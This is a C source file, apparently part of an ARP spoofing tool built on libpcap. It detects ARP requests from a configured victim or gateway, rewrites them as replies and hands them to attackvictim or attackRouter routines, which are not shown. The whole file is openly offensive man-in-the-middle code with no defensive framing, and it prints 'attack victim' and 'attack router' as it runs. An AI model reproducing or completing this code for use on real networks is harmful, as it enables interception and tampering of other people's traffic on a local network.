#include "myHeader.h"

int checkVictim(Pethernet_header eh, PLANINFO LanInfo);
int checkGateWay(Pethernet_header eh, PLANINFO LanInfo);

int checkARP(pcap_t* handle, const u_char* packet, PLANINFO LanInfo)
{
	PHEADER header;
	header = (PHEADER)packet;
	u_short ether_type = ntohs(header->ethernet.ether_Type);
	u_short OpCode = ntohs(header->arp.Opcode);
	/* arp : 0x0806, requet : 0x0001*/
	if (ether_type == 0x0806 && OpCode == 0x0001)
	{
		if (checkVictim(&(header->ethernet), LanInfo))
		{
			header->arp.Opcode = ntohs(0x0002);
			printf("attack victim\n");
			attackvictim(handle, header, LanInfo);
		}
		else if (checkGateWay(&(header->ethernet), LanInfo))
		{
			header->arp.Opcode = ntohs(0x0002);
			printf("attack router\n");
			attackRouter(handle, header, LanInfo);
		}
		return 1;
	}
	//ipHeader(packet + 14);
	//tcpHeader(packet + 34);
	return 0;
}

int checkVictim(Pethernet_header eh, PLANINFO LanInfo)
{
	int check = 1;
	for (int i = 0; i < 6; i++)
	{
		if (eh->src_MAC[i] != LanInfo->victimMAC[i] || eh->dst_MAC[i] != LanInfo->myMAC[i])
		{
			check = 0;
			break;
		}
	}
	return check;
}

int checkGateWay(Pethernet_header eh, PLANINFO LanInfo)
{
	int check = 1;
	for (int i = 0; i < 6; i++)
	{
		if (eh->src_MAC[i] != LanInfo->gatewayMAC[i] || eh->dst_MAC[i] != LanInfo->myMAC[i])
		{
			check = 0;
			break;
		}
	}
	return check;
}